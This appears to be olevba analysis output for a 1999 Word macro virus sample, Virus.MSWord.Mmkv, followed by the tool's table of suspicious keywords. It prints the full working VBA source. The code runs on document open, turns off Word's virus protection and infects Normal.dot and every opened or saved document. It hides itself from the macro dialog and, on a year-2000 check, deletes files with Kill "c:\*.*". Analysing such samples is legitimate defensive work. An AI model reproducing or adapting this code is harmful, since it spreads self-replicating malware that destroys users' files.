olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mmkv-d0ad573f704aa2a66fe6d060d3f9d9343b7a908b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mmkv-d0ad573f704aa2a66fe6d060d3f9d9343b7a908b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MMKV.bas 
in file: Virus.MSWord.Mmkv-d0ad573f704aa2a66fe6d060d3f9d9343b7a908b - OLE stream: 'Macros/VBA/MMKV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WinDir As String
Public DataDot As Boolean

Sub AutoExec()
AutoOpen
End Sub
Sub AutoOpen()
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Welcome To Y2K", 0, "MK-Words By MMK 1999"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Copy_Tmp
Copy_Vir
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument, "MMKV", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FileOpen()
fa = Dialogs(wdDialogFileOpen).Show
If fa = "" Then GoTo asa
Copy_Vir
asa:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Find_Win
NormalTemplate.VBProject.VBComponents("MMKV").Export WinDir + "\SYSTEM\" + "WINMK.SYS"
Application.OrganizerDelete NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
While Dialogs(wdDialogToolsMacro).Display
Wend
NormalTemplate.VBProject.VBComponents.import WinDir + "\SYSTEM\" + "WINMK.SYS"
Kill WinDir + "\SYSTEM\" + "WINMK.SYS"
End Sub
Sub FileSave()
If ActiveDocument.FullName = "" Then Dialogs(wdDialogFileSaveAs).Show
Copy_Vir
ActiveDocument.Save
End Sub
Sub viewvbcode()
End Sub
Sub Find_Win()
Close
Dim WD As String
On Error GoTo Err_F
F = FreeFile
Open "c:\msdos.sys" For Input As #F
Do Until EOF(F)
Line Input #F, WD
If Left(UCase(WD), 7) = "WINDIR=" Then
    L = Len(WD)
    WinDir = UCase$(Mid$(WD, 8, L))
End If
Loop
GoTo END_S
Err_F:
WinDir = ""
END_S:
Close #F
End Sub
Sub Copy_Vir()
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "MMKV", wdOrganizerObjectProjectItems
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
ActiveDocument.Save
INFECTED:
End Sub
Sub Copy_Tmp()
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
ActiveDocument.Save
INFECTED:
Copy_Vir
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

